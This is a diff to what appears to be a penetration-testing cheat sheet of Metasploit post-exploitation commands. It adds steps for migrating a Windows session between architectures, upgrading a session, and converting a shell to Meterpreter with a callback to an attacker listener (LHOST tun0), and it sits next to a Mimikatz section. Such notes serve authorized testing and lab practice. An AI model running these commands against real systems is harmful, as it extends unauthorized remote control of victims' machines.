@@ -206,10 +206,23 @@ run -o SESSION=<1>,TECHNIQUE=<6>
 ```
 
 # Migrate between architectures
+## archmigrate
 ```ruby
 use post/windows/manage/archmigrate
 set SESSION <1>
 ```
+
+## session
+```ruby
+session -u 3
+```
+
+## shell_to_meterpreter
+```ruby
+use post/multi/manage/shell_to_meterpreter
+run -o LHOST=<tun0>,LPORT=<10003>,SESSION=<1>
+```
+
 
 # Mimikatz
 ## Meterpreter
